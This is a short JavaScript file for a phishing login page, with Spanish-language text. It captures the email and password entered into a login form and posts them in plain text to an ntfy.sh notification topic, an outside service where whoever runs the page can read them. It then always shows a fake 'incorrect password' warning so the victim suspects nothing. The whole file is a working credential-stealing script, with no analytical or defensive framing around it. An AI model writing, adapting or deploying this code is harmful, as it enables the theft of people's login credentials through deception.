document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  const message = `Login:\nCorreo: ${email}\nContraseña: ${password}`;

  try {
    await fetch('https://ntfy.sh/117566101', {
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: message
    });
    Swal.fire({
	title: '¡Error',
	text: 'Contraseña incorrecta',
	icon: 'warning',
	confirmButtonText: 'Entendido'
    });
  } catch (err) {
    alert("Error de red.");
    console.error(err);
  }
});
